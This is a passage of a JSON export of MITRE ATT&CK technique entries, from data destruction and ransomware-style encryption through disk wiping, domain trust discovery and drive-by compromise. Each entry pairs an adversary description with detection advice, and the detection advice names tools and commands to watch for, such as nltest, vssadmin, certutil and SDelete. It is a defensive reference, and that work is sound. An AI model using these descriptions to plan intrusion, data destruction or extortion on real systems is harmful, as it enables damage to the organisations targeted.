                "detection": "Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\\Windows\\System32\\</code>.\n\nIn cloud environments, the occurrence of anomalous high-volume deletion events, such as the <code>DeleteDBCluster</code> and <code>DeleteGlobalCluster</code> events in AWS, or a high quantity of data deletion events, such as <code>DeleteBucket</code>, within a short period of time may indicate suspicious activity.",
                "permissions": [
                    "User",
                    "Administrator",
                    "root",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1132",
                "name": "Data Encoding",
                "description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
                "url": "https://attack.mitre.org/techniques/T1132",
                "data_sources": [
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1486",
                "name": "Data Encrypted for Impact",
                "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017)\n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)",
                "url": "https://attack.mitre.org/techniques/T1486",
                "data_sources": [
                    "Cloud Storage: Cloud Storage Metadata",
                    "Cloud Storage: Cloud Storage Modification",
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "File: File Modification",
                    "File: File Creation"
                ],
                "detection": "Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.\n\nIn some cases, monitoring for unusual kernel driver installation activity can aid in detection.\n\nIn cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies.",
                "permissions": [
                    "User",
                    "Administrator",
                    "root",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "IaaS"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1565",
                "name": "Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "url": "https://attack.mitre.org/techniques/T1565",
                "data_sources": [
                    "File: File Metadata",
                    "Process: OS API Execution",
                    "File: File Creation",
                    "File: File Deletion",
                    "File: File Modification",
                    "Network Traffic: Network Traffic Content",
                    "Network Traffic: Network Traffic Flow"
                ],
                "detection": "Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data.",
                "permissions": [
                    "User",
                    "Administrator",
                    "root",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1001",
                "name": "Data Obfuscation",
                "description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ",
                "url": "https://attack.mitre.org/techniques/T1001",
                "data_sources": [
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1074",
                "name": "Data Staged",
                "description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
                "url": "https://attack.mitre.org/techniques/T1074",
                "data_sources": [
                    "File: File Access",
                    "File: File Creation",
                    "Command: Command Execution"
                ],
                "detection": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1030",
                "name": "Data Transfer Size Limits",
                "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
                "url": "https://attack.mitre.org/techniques/T1030",
                "data_sources": [
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1530",
                "name": "Data from Cloud Storage Object",
                "description": "Adversaries may access data objects from improperly secured cloud storage.\n\nMany cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019)\n\nMisconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.",
                "url": "https://attack.mitre.org/techniques/T1530",
                "data_sources": [
                    "Cloud Storage: Cloud Storage Access"
                ],
                "detection": "Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "IaaS"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1602",
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "url": "https://attack.mitre.org/techniques/T1602",
                "data_sources": [
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Identify network traffic sent or received by untrusted hosts or networks that solicits and obtains the configuration information of the queried device.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)",
                "permissions": [
                    "Administrator"
                ],
                "platforms": [
                    "Network"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1213",
                "name": "Data from Information Repositories",
                "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include [Sharepoint](https://attack.mitre.org/techniques/T1213/002), [Confluence](https://attack.mitre.org/techniques/T1213/001), and enterprise databases such as SQL Server.",
                "url": "https://attack.mitre.org/techniques/T1213",
                "data_sources": [
                    "Logon Session: Logon Session Creation",
                    "Application Log: Application Log Content"
                ],
                "detection": "As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nThe user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS",
                    "SaaS",
                    "Office 365",
                    "Google Workspace"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1005",
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "url": "https://attack.mitre.org/techniques/T1005",
                "data_sources": [
                    "File: File Access",
                    "Command: Command Execution"
                ],
                "detection": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1039",
                "name": "Data from Network Shared Drive",
                "description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",
                "url": "https://attack.mitre.org/techniques/T1039",
                "data_sources": [
                    "File: File Access",
                    "Network Share: Network Share Access",
                    "Command: Command Execution"
                ],
                "detection": "Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1025",
                "name": "Data from Removable Media",
                "description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",
                "url": "https://attack.mitre.org/techniques/T1025",
                "data_sources": [
                    "File: File Access",
                    "Command: Command Execution"
                ],
                "detection": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1491",
                "name": "Defacement",
                "description": "Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. \n",
                "url": "https://attack.mitre.org/techniques/T1491",
                "data_sources": [
                    "File: File Modification",
                    "File: File Creation",
                    "Application Log: Application Log Content",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Monitor internal and external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\n\n",
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1140",
                "name": "Deobfuscate/Decode Files or Information",
                "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)",
                "url": "https://attack.mitre.org/techniques/T1140",
                "data_sources": [
                    "Process: Process Creation",
                    "File: File Modification",
                    "Script: Script Execution"
                ],
                "detection": "Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1610",
                "name": "Deploy Container",
                "description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.(Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",
                "url": "https://attack.mitre.org/techniques/T1610",
                "data_sources": [
                    "Container: Container Creation",
                    "Container: Container Start",
                    "Pod: Pod Creation",
                    "Pod: Pod Modification",
                    "Application Log: Application Log Content"
                ],
                "detection": "Monitor for suspicious or unknown container images and pods in your environment. Deploy logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application pods to detect malicious activity at the cluster level. In Docker, the daemon log provides insight into remote API calls, including those that deploy containers. Logs for management services or applications used to deploy containers other than the native technologies themselves should also be monitored.",
                "permissions": [
                    "User",
                    "root"
                ],
                "platforms": [
                    "Containers"
                ],
                "tactics": [
                    "defense-evasion",
                    "execution"
                ]
            },
            {
                "id": "T1587",
                "name": "Develop Capabilities",
                "description": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",
                "url": "https://attack.mitre.org/techniques/T1587",
                "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "resource-development"
                ]
            },
            {
                "id": "T1006",
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)",
                "url": "https://attack.mitre.org/techniques/T1006",
                "data_sources": [
                    "Command: Command Execution",
                    "Drive: Drive Access"
                ],
                "detection": "Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)\n\nMonitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1059/001), additional logging of PowerShell scripts is recommended.",
                "permissions": [
                    "Administrator"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1561",
                "name": "Disk Wipe",
                "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",
                "url": "https://attack.mitre.org/techniques/T1561",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Driver: Driver Load",
                    "Drive: Drive Access",
                    "Drive: Drive Modification"
                ],
                "detection": "Look for attempts to read/write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.",
                "permissions": [
                    "User",
                    "root",
                    "SYSTEM",
                    "Administrator"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1484",
                "name": "Domain Policy Modification",
                "description": "Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.\n\nWith sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) Adversaries can also change configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n\nAdversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
                "url": "https://attack.mitre.org/techniques/T1484",
                "data_sources": [
                    "Active Directory: Active Directory Object Creation",
                    "Active Directory: Active Directory Object Deletion",
                    "Active Directory: Active Directory Object Modification",
                    "Command: Command Execution"
                ],
                "detection": "It may be possible to detect domain policy modifications using Windows event logs. Group policy modifications, for example, may be logged under a variety of Windows event IDs for modifying, creating, undeleting, moving, and deleting directory service objects (Event ID 5136, 5137, 5138, 5139, 5141 respectively). Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)(Citation: Microsoft 365 Defender Solorigate) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)\n\nConsider monitoring for commands/cmdlets and command-line arguments that may be leveraged to modify domain policy settings.(Citation: Microsoft - Update or Repair Federated domain) Some domain policy modifications, such as changes to federation settings, are likely to be rare.(Citation: Microsoft 365 Defender Solorigate)",
                "permissions": [
                    "Administrator",
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD"
                ],
                "tactics": [
                    "defense-evasion",
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1482",
                "name": "Domain Trust Discovery",
                "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
                "url": "https://attack.mitre.org/techniques/T1482",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution",
                    "Script: Script Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)\n",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1189",
                "name": "Drive-by Compromise",
                "description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).\n\nMultiple ways of delivering exploit code to a browser exist, including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)",
                "url": "https://attack.mitre.org/techniques/T1189",
                "data_sources": [
                    "File: File Creation",
                    "Process: Process Creation",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content",
                    "Application Log: Application Log Content"
                ],
                "detection": "Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.\n\nNetwork intrusion detection systems, sometimes with SSL/TLS MITM inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.\n\nDetecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "SaaS"
                ],
                "tactics": [
                    "initial-access"
                ]
            },
            {
                "id": "T1568",
                "name": "Dynamic Resolution",
